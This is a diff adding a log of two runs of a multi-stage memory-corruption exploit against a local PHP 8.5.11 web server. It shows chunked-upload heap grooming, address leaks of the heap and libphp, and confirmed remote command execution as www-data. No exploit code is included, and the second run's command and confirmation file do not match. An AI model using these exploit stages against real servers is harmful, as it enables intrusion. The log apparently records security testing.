@@ -1,0 +1,36 @@
+[16:41:41] target=https://127.0.0.1:18129/index.php stage=3 cmd='id>t1' log=live_run_20261026_164141.log
+[16:41:41] [preflight] GET / -> HTTP/1.1 200 OK (3 bytes)
+[16:41:42] [*] target PHP version = 8.5.11 (profile selected)
+[16:41:42] [preflight] GET /p -> HTTP/1.1 404 Not Found (pre-existing body=314 bytes)
+[16:41:42] [stage1] try 1: arming (chunked ~140MB upload)...
+[16:41:44] [stage1] arm done in 2.3s: HTTP/1.1 200 OK
+[16:41:46] [stage1] LEAK chunk base = 0x7ffffe000000 (cluster n=98)
+[16:41:46] [stage2] try 1: arming (chunked ~140MB upload)...
+[16:41:48] [stage2] arm done in 2.3s: HTTP/1.1 200 OK
+[16:41:50] [stage2] LEAK libphp base = 0x7ffffaa00000 (ptr=0x7ffffb1b47a0, dtor gate OK)
+[16:41:50] [*] HT=0x7ffffe07e0d8 zif_abs=0x7ffffaf996e0 carrier=standard
+[16:41:50] [stage3] cycle 1: arming pads=112 (chunked ~140MB upload)...
+[16:41:53] [stage3] arm done in 2.3s: HTTP/1.1 200 OK
+[16:41:53] [stage3] exploit sent in 0.0s: '<no response>'
+[16:41:55] [stage3] RCE CONFIRMED cycle 1: GET /t1 -> HTTP/1.1 200 OK body=b'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n'
+[16:41:55] === FULL RCE CONFIRMED ===
+
+
+================ SECOND RUN (extended carrier) ================
+
+[16:41:55] target=https://127.0.0.1:18129/index.php stage=3 cmd='echo tls-ext-ok > t2' log=live_run_20261026_164155.log
+[16:41:55] [preflight] GET / -> HTTP/1.1 200 OK (3 bytes)
+[16:41:55] [*] target PHP version = 8.5.11 (profile selected)
+[16:41:55] [preflight] GET /p -> HTTP/1.1 404 Not Found (pre-existing body=314 bytes)
+[16:41:55] [stage1] try 1: arming (chunked ~140MB upload)...
+[16:41:58] [stage1] arm done in 2.4s: HTTP/1.1 200 OK
+[16:42:00] [stage1] LEAK chunk base = 0x7ffffe000000 (cluster n=98)
+[16:42:00] [stage2] try 1: arming (chunked ~140MB upload)...
+[16:42:02] [stage2] arm done in 2.4s: HTTP/1.1 200 OK
+[16:42:04] [stage2] LEAK libphp base = 0x7ffffaa00000 (ptr=0x7ffffb1b47a0, dtor gate OK)
+[16:42:04] [*] HT=0x7ffffe07e218 zif_abs=0x7ffffaf996e0 carrier=extended
+[16:42:04] [stage3] cycle 1: arming pads=112 (chunked ~140MB upload)...
+[16:42:06] [stage3] arm done in 2.3s: HTTP/1.1 200 OK
+[16:42:07] [stage3] exploit sent in 0.0s: '<no response>'
+[16:42:09] [stage3] RCE CONFIRMED cycle 1: GET /pp -> HTTP/1.1 200 OK body=b'p2s1793047324\n'
+[16:42:09] === FULL RCE CONFIRMED ===
